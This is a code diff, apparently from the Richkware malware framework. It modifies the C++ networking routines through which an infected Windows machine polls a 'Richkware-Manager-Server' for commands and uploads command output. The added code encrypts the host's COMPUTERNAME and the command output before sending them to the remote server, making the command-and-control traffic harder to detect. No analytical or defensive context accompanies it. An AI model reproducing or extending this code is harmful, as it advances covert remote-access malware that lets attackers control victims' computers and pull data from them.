@@ -2,8 +2,6 @@
 *      Copyright 2016 Riccardo Melioli.
 */
 
-#include <iostream>
-
 #include "network.h"
 
 Server::Server(std::string encryptionKeyArg) {
@@ -187,8 +185,7 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
     return true;
 }
 
-std::string Network::fetchCommand() {
-
+std::string Network::fetchCommand(const std::string &encryptionKey) {
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
     device.append("/");
@@ -197,8 +194,10 @@ std::string Network::fetchCommand() {
     std::string srvAddr(serverAddress);
     std::string prt(port);
 
+    device = crypto.Encrypt(device);
+
     http::Request request(
-            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data={\"data0\":\"" + device + "\"}" +
+            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device +
             "&channel=richkware");
 
 //    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
@@ -266,8 +265,7 @@ std::string Network::fetchCommand() {
 //    }
 }
 
-bool Network::uploadCommand(std::string commandsOutput) {
-
+bool Network::uploadCommand(std::string commandsOutput, const std::string &encryptionKey) {
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
     device.append("/");
@@ -277,6 +275,8 @@ bool Network::uploadCommand(std::string commandsOutput) {
     std::string prt(port);
 
     http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");
+
+    commandsOutput = crypto.Encrypt(commandsOutput);
 
     std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\"}";
 
